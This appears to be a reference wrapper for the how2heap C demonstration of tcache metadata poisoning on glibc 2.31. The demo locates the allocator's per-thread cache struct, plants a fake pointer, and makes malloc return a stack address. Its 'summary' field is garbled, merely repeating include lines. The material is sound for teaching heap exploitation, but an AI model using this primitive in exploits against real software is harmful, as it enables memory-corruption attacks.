---
title: "Tcache Metadata Poisoning (how2heap)"
category: "pwn"
subcategory: "heap"
type: "script"
tags: ["how2heap", "tcache-metadata-poisoning.c", "heap", "tcache", "metadata", "poisoning", "tcache-metadata-poisoning", "pwn"]
summary: "include <assert.h> include <stdint.h> include <stdio.h> include <stdlib.h>"
tools: ["how2heap"]
source:
  name: "shellphish/how2heap"
  url: "https://github.com/shellphish/how2heap/blob/02da6aa26a44/glibc_2.31/tcache_metadata_poisoning.c"
license: "MIT"
---

## What it does

include <assert.h> include <stdint.h> include <stdio.h> include <stdlib.h>

## Where it lives

- Vendored locally at `vendor/how2heap/glibc_2.31/tcache_metadata_poisoning.c`
- Upstream: <https://github.com/shellphish/how2heap/blob/02da6aa26a44/glibc_2.31/tcache_metadata_poisoning.c>

## Usage

```bash
# read or run it straight from the vendored copy
$EDITOR vendor/how2heap/glibc_2.31/tcache_metadata_poisoning.c
gcc -g -o /tmp/tcache_metadata_poisoning vendor/how2heap/glibc_2.31/tcache_metadata_poisoning.c && /tmp/tcache_metadata_poisoning
```

## Code

```c
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// Tcache metadata poisoning attack
// ================================
//
// By controlling the metadata of the tcache an attacker can insert malicious
// pointers into the tcache bins. This pointer then can be easily accessed by
// allocating a chunk of the appropriate size.

// By default there are 64 tcache bins
#define TCACHE_BINS 64
// The header of a heap chunk is 0x10 bytes in size
#define HEADER_SIZE 0x10

// This is the `tcache_perthread_struct` (or the tcache metadata)
struct tcache_metadata {
  uint16_t counts[TCACHE_BINS];
  void *entries[TCACHE_BINS];
};

int main() {
  // Disable buffering
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  uint64_t stack_target = 0x1337;

  puts("This example demonstrates what an attacker can achieve by controlling\n"
       "the metadata chunk of the tcache.\n");
  puts("First we have to allocate a chunk to initialize the stack. This chunk\n"
       "will also serve as the relative offset to calculate the base of the\n"
       "metadata chunk.");
  uint64_t *victim = malloc(0x10);
  printf("Victim chunk is at: %p.\n\n", victim);

  long metadata_size = sizeof(struct tcache_metadata);
  printf("Next we have to calculate the base address of the metadata struct.\n"
         "The metadata struct itself is %#lx bytes in size. Additionally we\n"
         "have to subtract the header of the victim chunk (so an extra 0x10\n"
         "bytes).\n",
         sizeof(struct tcache_metadata));
  struct tcache_metadata *metadata =
      (struct tcache_metadata *)((long)victim - HEADER_SIZE - metadata_size);
  printf("The tcache metadata is located at %p.\n\n", metadata);

  puts("Now we manipulate the metadata struct and insert the target address\n"
       "in a chunk. Here we choose the second tcache bin.\n");
  metadata->counts[1] = 1;
  metadata->entries[1] = &stack_target;

  uint64_t *evil = malloc(0x20);
  printf("Lastly we malloc a chunk of size 0x20, which corresponds to the\n"
         "second tcache bin. The returned pointer is %p.\n",
         evil);
  assert(evil == &stack_target);
}

```

## Attribution

- **Author:** Shellphish
- **Repository:** <https://github.com/shellphish/how2heap> (commit `02da6aa26a44`)
- **Licence:** MIT — see `vendor/how2heap/LICENSE`

This file is a wrapper for search and reference. The code is the original authors' work, redistributed unmodified under its own licence.
